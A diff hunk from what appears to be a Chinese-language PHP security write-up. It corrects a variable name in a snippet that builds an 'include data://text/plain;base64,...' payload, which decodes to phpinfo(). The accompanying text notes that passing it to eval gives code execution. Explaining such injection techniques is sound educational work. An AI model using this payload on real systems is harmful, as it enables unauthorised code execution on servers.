@@ -57,7 +57,7 @@ $num1 = "include data:/";
 $symbol = "/";
 $num2 = "text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
 
-$num1$symbol$sum2="include data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
+$num1$symbol$num2="include data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
 ~~~
 放到eval里面后，就能代码执行了,使用更优雅的写法
 ~~~
